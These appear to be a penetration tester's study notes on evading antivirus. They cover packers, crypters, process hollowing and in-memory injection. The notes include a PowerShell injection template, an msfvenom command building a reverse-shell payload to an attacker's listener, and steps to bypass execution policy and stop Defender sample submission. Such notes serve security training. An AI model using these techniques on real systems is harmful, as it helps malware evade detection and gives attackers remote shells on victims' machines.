### AntiVirus Evasion

Anti-virus works in a number of different ways.  Starting out as purely signature based, it made decisions based on different signatures that it knew.  Comparing traffic to those signatures was how it determined if what it was comparing was malicious.

Depending on the AV engine, these signatures can vary greatly, even for the same piece of malware.  One signature may deal with the malware stored on a hard drive and another may deal with the malware while it's in transmission on the network.

VirusTotal can be a good resource to check binaries against.  But, do note that any file submitted to VirusTotal is considered Public upon submission.  One other option that claims to not share these details is a site called `https://www.kleenscan.com`.  Does very close to what VirusTotal does but claims to not share what they recieve.  Either way, this should really be a last resort.

Beyond that though, VirusTotal can give you a wealth of information about a file that was uploaded in the behavior tab.  It may take a sec to run but it's worth the wait.

#### On-Disk Evasion

`packers` were used in the early times as a way to compress executables.  Not just like a ZIP file, these would actually generate an executable that was smaller but did the same thing as the original source code.  This would also change the hash making it an effective way to bypass signature based AV models of the time.

`obfuscators` change and mutate code.  They can even add irrelevant bits of code called `dead code`.  They can split and reorder functions, or replace bits of code with different code but will get the same output.  Used a lot by developers to protect IP, it's decent against signature based AVs.  Some modern ones even have `runtime in-memory` capabilities, making it even harder for AV to detect.

`crypter` software can encrypt exectuable code and add a decryption stub to restore code upon execution.  Since the decryption happens in memory, this avoids AV detection from scanners of storage.

#### In-Memory Evasion

`In-Memory Injection`, or PE Injection, plants the payload directly into volitile memory and never writes anything to the hard drive.  There are a number of these but some go into C/C++ programing.

`Reflective DLL Injection` attempts to load a DLL in the process memory instead of loading it from the disk.  This is difficult due to the fact that no Windows APIs that could take those are exposed.

`Process Hollowing` involves launching a non-malicious process in a suspended state.  Then removing the image of the process from memory and replacing it with the payload.  Then the process is resumed and the payload triggers.

#### Testing for AV Evasion

You could use the tools mentioned above, VirusTotal or Kleenscan (likely to stick with Kleenscan depending on what you are looking at as VirusTotal shares what is submitted to them).

Ideally, you want to build a VM that mimics your target as closely as possible.  We can turn off automatic submission of samples in Windows Defender by navigating to `Windows Security` -> `Virus & Threat Protection` -> `Manage Settings` and turning off the Automatic Sample Submission switch.

We should also lean towards custom code.  The more we're able to make custom code, the less it will show up in signature databases.

#### In-Memory Injection

Remote process memory injection targets a process.  Powershell is a good resource to use (if available) to try and do this.  The powershell tool runs scripts instead of compiled code, which makes it harder for some AVs to detect.

```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

<place shellcode here>
```

Create your payload with `msfvenom`.

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.x.x LPORT=443 -f psh-reflection`

The `-f psh-reflection` gives the variables a random value on the output, further helping to bypass signature based AVs.  Take its output and place it in the code where is has `<place shellcode here>`.

Trying to run this still gives an execution policy error.

We can use `-ExecutionPolicy bypass` flag with the script.  We can also enable this for the user itself.

```
Get-ExecutionPolicy -Scope CurrentUser  
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

The first line checks the current policy.  The second line sets the policy to `Unrestricted`.  This should allow us to run the script.

Once we run the script, we get a shell on our listener :D

#### Automating the Process

`shellter` is a tool used to automate the process of evading AV.  It uses novel and advanced techniques in order to get your payload past AV.

In order to use `shellter` you need to install `wine` if you are on a linux distro.  You'll also want to run the following (in root).

`sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine32`